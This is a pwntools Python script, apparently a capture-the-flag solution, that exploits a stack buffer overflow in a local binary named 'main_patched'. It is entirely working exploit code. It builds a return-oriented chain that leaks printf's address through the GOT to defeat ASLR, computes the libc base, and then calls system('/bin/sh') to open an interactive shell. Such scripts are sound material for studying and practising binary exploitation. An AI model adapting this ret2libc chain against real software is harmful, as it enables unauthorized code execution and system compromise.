#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

#r = exe.process()
r = gdb.debug(['./main_patched'], gdbscript="""
init-pwndbg
""")

pop_rdi = 0x0000000000401283
ret = 0x000000000040101a

pay = b'a' * (24)
pay += p64(pop_rdi)
pay += p64(exe.got['printf'])
pay += p64(ret)
pay += p64(exe.plt['printf'])
pay += p64(exe.sym['main'] + 5)

print(len(pay))
print(pay)

r.sendafter(b'$ ', pay)
r.sendlineafter(b'$ ', b'exit')

leaks = u64(r.recvuntil(b'$')[:-1] + b'\x00\x00')

print("LEAKS", hex(leaks))

libc.address = leaks - libc.sym['printf']

print("LIBC", hex(libc.address))

pay = b'a' * 24
pay += p64(pop_rdi)
pay += p64(next(libc.search(b'/bin/sh\x00')))
pay += p64(ret)
pay += p64(libc.sym['system'])

r.sendline(pay)
r.sendlineafter(b'$ ', b'exit')

r.interactive()
